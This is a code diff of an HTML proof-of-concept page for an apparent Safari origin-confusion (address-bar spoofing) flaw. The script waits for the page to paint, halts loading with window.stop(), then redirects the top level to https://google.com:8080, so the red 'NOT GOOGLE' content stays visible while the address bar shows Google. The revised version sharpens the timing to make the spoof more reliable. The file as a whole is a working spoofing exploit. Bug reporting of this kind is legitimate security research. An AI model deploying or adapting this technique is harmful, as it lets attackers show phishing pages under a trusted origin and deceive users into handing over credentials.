@@ -1,49 +1,62 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Safari Origin Confusion PoC</title>
+<meta charset="UTF-8">
+<title>Safari Transient Origin PoC</title>
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  background: #b00000;
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: -apple-system, sans-serif;
+  font-size: 48px;
+  text-align: center;
+}
+#origin {
+  position: fixed;
+  bottom: 10px;
+  font-size: 14px;
+}
+</style>
 </head>
 
-<body style="
-  margin:0;
-  background:#b00000;
-  color:white;
-  font-family:-apple-system;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  height:100vh;
-  font-size:48px;
-  text-align:center;
-">
-  <div>
-    NOT GOOGLE<br>
-    Origin Confusion Demo
-  </div>
+<body>
+<div>
+  NOT GOOGLE<br>
+  Origin Confusion Demo
+</div>
+<div id="origin">Origin: ecdnts-del.github.io</div>
 
 <script>
-function spoof() {
-    // delay sebentar biar user siap
-    setTimeout(() => {
-        // Stop loading halaman ini (Safari akan tetap render apa yang sudah terlihat)
+function strongPoC() {
+
+  // PHASE 1 — tunggu browser selesai paint (penting di Safari)
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+
+      // PHASE 2 — beri delay kecil supaya teks benar-benar terlihat
+      setTimeout(() => {
+
+        // hentikan loading (Safari tetap render halaman lama)
         window.stop();
 
-        // pilih port random (tidak 0 atau 443)
-        let randomPort;
-        do {
-            randomPort = Math.floor(Math.random() * 1000);
-        } while (randomPort === 0 || randomPort === 443);
+        // PHASE 3 — commit top-level navigation
+        location.href = "https://google.com:8080";
 
-        // ganti top-level location
-        document.location = "https://google.com:" + randomPort + "/";
-    }, 500); // 0.5 detik, cukup untuk render halaman merah
+        console.log("Navigation committed, old content still rendered");
 
+      }, 300); // sweet spot Safari (200–400ms)
+
+    });
+  });
 }
 
-// jalankan PoC otomatis
-spoof();
+strongPoC();
 </script>
-
 </body>
 </html>
